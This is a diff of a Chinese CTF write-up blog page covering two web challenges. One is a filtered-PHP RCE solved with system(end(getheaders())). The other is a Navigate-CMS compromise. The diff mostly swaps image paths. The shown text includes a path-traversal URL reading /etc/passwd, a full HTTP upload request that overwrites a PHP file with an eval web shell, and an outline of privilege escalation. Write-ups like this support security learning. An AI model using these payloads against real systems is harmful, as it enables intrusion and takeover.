@@ -28,11 +28,16 @@
 <meta property="og:site_name" content="匆匆那年">
 <meta property="og:description" content="其实这次web题目质量一般，可能web只有一道题目做起来让人觉得知识点和考察方式都很好，既简单又困难的那种感觉吧，web题目应该是AK了，但是有一部分没啥营养，这里就记录下两道题目： 1、简单的php  2、高手高手高高手 简单的php这道题目其实以前也遇到过，不过这里过滤了更多的东西，中心思想还是一致的，我们首先看代码： 123456789&lt;?phpshow_source(__FILE__">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://localhost:4000/images/pages/image-20220705155003413.png">
+<meta property="og:image" content="http://localhost:4000/images/pages/image-20220705160301716.png">
+<meta property="og:image" content="http://localhost:4000/images/pages/image-20220705161744409.png">
+<meta property="og:image" content="http://localhost:4000/images/pages/image-20220705162041847.png">
 <meta property="article:published_time" content="2022-07-05T07:27:28.000Z">
-<meta property="article:modified_time" content="2022-07-05T08:27:20.189Z">
+<meta property="article:modified_time" content="2022-07-05T08:33:25.065Z">
 <meta property="article:author" content="Geez">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://localhost:4000/images/pages/image-20220705155003413.png">
 
 <link rel="canonical" href="http://localhost:4000/posts/PCL-CTF-WEB2/">
 
@@ -237,14 +242,14 @@
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>5.1k</span>
+              <span>4.6k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="fa fa-clock-o"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>5 分钟</span>
+              <span>4 分钟</span>
             </span>
 
         </div>
@@ -277,10 +282,10 @@
 <p>也就是payload经过循环过滤后仅剩下;  也就是payload只能是无参的形式：a(abc(dsada())); 这种</p>
 <p>那我们就用一些特殊函数：</p>
 <p>getheaders获取headers信息，end是获取最后一个，system直接系统命令，我们只需把需要执行的命令放入header的最后一个字段就行了。system(end(getheaders())) </p>
-<p>![image-20220705155003413](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220705155003413.png)</p>
+<p><img data-src="/images/pages/image-20220705155003413.png" alt="image-20220705155003413"></p>
 <h2 id="高手高手高高手"><a href="#高手高手高高手" class="headerlink" title="高手高手高高手"></a>高手高手高高手</h2><p>由于没有环境了可能只是说一下思路和当时遇到的问题。</p>
 <p>首先这道题目是Navigate-CMS 目录有git泄漏：</p>
-<p>![image-20220705160301716](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220705160301716.png)</p>
+<p><img data-src="/images/pages/image-20220705160301716.png" alt="image-20220705160301716"></p>
 <p>但是这里的git泄漏我并没有拿到源码，不知道是不是有什么奇怪知识点。所以就去github上找了对应的<a target="_blank" rel="noopener" href="https://github.com/NavigateCMS/Navigate-CMS">Navigatecms</a> 源码</p>
 <p>通过搜索最近的漏洞详情，发现2022年刚爆出一个任意文件读取的漏洞提醒，根据代码审计了对应代码发现在navigate_download.php存在id参数的任意文件读取：</p>
 <p>payload：<a target="_blank" rel="noopener" href="http://192.168.1.xxx/navigate_download.php?id=../../../../../../../../../../../../../../../etc/passwd">http://192.168.1.xxx/navigate_download.php?id=../../../../../../../../../../../../../../../etc/passwd</a></p>
@@ -294,12 +299,12 @@
 
 
 <p>拿到源码发现漏洞存在于139行</p>
-<p>![image-20220705161744409](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220705161744409.png)</p>
+<p><img data-src="/images/pages/image-20220705161744409.png" alt="image-20220705161744409"></p>
 <p>engine&#x3D;picnik时可以进行文件覆盖，但是这里过滤了..&#x2F; 仍然很好绕过 通过…&#x2F;.&#x2F;得到..&#x2F;，所以我们直接覆盖navigate_info.php这个文件的内容：</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/navigate_upload.php?session_id=vcu80v6qbgcjrajhka5acjh887&amp;engine=picnik&amp;id=../../../navigate_info.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.1.116</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>519</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarysFc8yFB2XMDgA35C</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.1.116</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.1.116/navigate.php?fid=websites&amp;act=2&amp;id=1</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>NVSID_7da51544=vcu80v6qbgcjrajhka5acjh887; PHPSESSID=vcu80v6qbgcjrajhka5acjh887; navigate-tinymce-scroll=%7B%7D; navigate-user=efc2e3b89151d3e84e01f5fc10d841703bf119dd; navigate-language=en; navigate-tree-structure-1=%5B%22node-0%22%2C%22node-2%22%5D</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysFc8yFB2XMDgA35C</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;name&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="number">12222345</span>.php</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysFc8yFB2XMDgA35C</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;chunk&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="number">0</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysFc8yFB2XMDgA35C</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;chunks&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="number">1</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysFc8yFB2XMDgA35C</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;122245.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/jpeg</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">phpinfo</span>();</span></span><br><span class="line"><span class="language-php">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmdd5556&#x27;</span>]);</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundarysFc8yFB2XMDgA35C--</span></span><br></pre></td></tr></table></figure>
 
 <p>拿到shell我们发现根目录存在I_want_capture_the_flag二进制文件,但是运行说什么皇家赌场还没下线，不给flag，二进制逆向发现回去判断两个文件存不存在，如果不存在再通过一系列运算给出flag:</p>
-<p>![image-20220705162041847](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220705162041847.png)</p>
+<p><img data-src="/images/pages/image-20220705162041847.png" alt="image-20220705162041847"></p>
 <p>现在我们知道需要删除&#x2F;var&#x2F;www&#x2F;html&#x2F;bocai.* ,但是我们并没有权限，这里我们就需要提权。首先我们根据网站目录下的隐藏php文件-&gt;</p>
 <p>&#x2F;var&#x2F;www&#x2F;html&#x2F;.my_date.php  的提示拿到账号密码 并可以ssh登陆 。登陆后发现账户下面存在.get_root目录里面有现成的提权脚本，先利用源码中的配置文件泄漏的用户navigate 运行mysql-privesc-race拿到mysql权限（时间很长，要等很久要有耐心），再利用得到的mysql账户权限运行mysql-chowned.sh，拿到root。（这两个提权网上可以搜索到，这里不再赘述，第一步提权有条件竞争需要等待较长时间）</p>
 <p>拿到root后我们去删除&#x2F;var&#x2F;www&#x2F;html&#x2F;bocai.*  依然不行，后来发现文件存在a属性，通过修改属性即可删除：</p>
